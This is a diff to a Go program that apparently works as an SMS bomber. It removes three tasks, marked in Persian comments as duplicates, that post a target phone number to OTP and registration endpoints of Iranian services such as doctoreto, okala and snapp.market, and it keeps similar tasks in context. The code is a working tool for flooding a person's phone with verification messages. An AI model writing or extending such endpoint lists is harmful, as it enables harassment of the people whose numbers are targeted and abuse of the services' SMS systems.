@@ -716,31 +716,6 @@ func main() {
 			}, &wg, ch)
 		}
 
-		// doctoreto.com (JSON) - تکراری، ولی اضافه میکنیم
-		wg.Add(1)
-		tasks <- func() {
-			sendJSONRequest(ctx, "https://api.doctoreto.com/api/web/patient/v1/accounts/register", map[string]interface{}{
-				"mobile": phone,
-			}, &wg, ch)
-		}
-
-		// api-react.okala.com (JSON) - تکراری، ولی اضافه میکنیم
-		wg.Add(1)
-		tasks <- func() {
-			sendJSONRequest(ctx, "https://api-react.okala.com/C/CustomerAccount/OTPRegister", map[string]interface{}{
-				"mobile": phone,
-			}, &wg, ch)
-		}
-
-		// number3:
-
-		// api.snapp.market (JSON) - تکراری، ولی اضافه میکنیم
-		wg.Add(1)
-		tasks <- func() {
-			sendJSONRequest(ctx, "https://api.snapp.market/mart/v1/user/loginMobileWithNoPass", map[string]interface{}{
-				"cellphone": phone,
-			}, &wg, ch)
-		}
 
 		// sabziman.com (Form) - مسیر wp-admin/admin-ajax.php معمولاً Form Data می پذیرد
 		wg.Add(1)
